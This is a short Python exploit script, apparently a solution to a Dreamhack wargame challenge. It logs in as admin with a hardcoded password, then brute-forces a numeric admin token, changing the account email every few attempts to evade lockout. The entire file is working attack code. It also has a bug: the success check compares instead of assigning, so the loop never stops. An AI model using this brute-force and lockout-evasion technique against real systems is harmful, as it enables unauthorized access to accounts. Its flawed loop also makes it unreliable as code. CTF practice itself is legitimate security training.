import requests
import random
import string
import sys


class Exploit():
    def __init__(self, port):
        self.status = False
        self.token = 100000
        self.baseurl = 'http://host3.dreamhack.games:'+port
        self.s = requests.session()

    def changeEmail(self):
        email = ''.join([string.ascii_letters[random.randint(1, 50)] for i in range(10)])
        data = {
            'name': 'Carl Dream',
            'age': 0,
            'email': f"{email}@example.com"
        }
        self.s.post(url=self.baseurl+'/mypage', data=data)

    def adminLogin(self):
        data = {
            'username': 'admin',
            'password': '7h15_i5_4dm1n_p4S5wo2d_:)'
        }
        self.s.post(url=self.baseurl+'/signin', data=data)

    def attack(self):
        self.adminLogin()
        while self.status == False:
            data = {'token': self.token}
            r = self.s.post(url=self.baseurl+'/admin', data=data)
            print(f"token > {self.token} {r.status_code} {r.text}")
            if self.token % 5 == 0:
                self.changeEmail()
            if r.status_code == 200:
                self.status == True
            self.token += 1


if __name__ == "__main__":
    Exploit(port=sys.argv[1]).attack()
    